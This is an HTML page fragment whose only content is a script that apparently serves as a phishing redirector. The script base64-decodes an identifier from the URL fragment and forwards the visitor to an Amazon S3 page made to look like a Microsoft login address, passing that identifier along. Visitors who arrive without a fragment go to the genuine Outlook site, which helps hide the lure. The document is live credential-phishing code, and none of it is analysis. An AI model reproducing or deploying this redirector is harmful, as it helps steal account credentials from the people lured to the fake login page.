   <body>
      <script>
         
         function b64DecodeUnicode(str) {
           // Going backwards: from bytestream, to percent-encoding, to original string.
           return decodeURIComponent(atob(str).split('').map(function(c) {
               return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
           }).join(''));
         }
         
         function redirectPage(){
           var query = window.location.href;
           console.log(query);
           var res = query.split("#");
           var data1 = res[0];
           var data2 = res[1];
           console.log(data1);
           console.log(data2);
         
           var id = b64DecodeUnicode(data2);
           console.log(id);
         
           if (data2)
           {
             console.log("true");
             window.location.href = "https://portal-auth-acess.s3.eu-central-1.amazonaws.com/ionos/login.microsoftonline.com.common.oauth2_v2.0-authorize%3Fclient_id%3Da8f591b1-74fe-45cb-983b-298d73684372%26response_type%3Dcode%26redirect_uri%3D%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25252520%25#"+id;
           }else{
             console.log("false");
             window.location.href = "https://outlook.office.com/mail/";
           }
         }
         
         redirectPage();
         
      </script>
   </body>
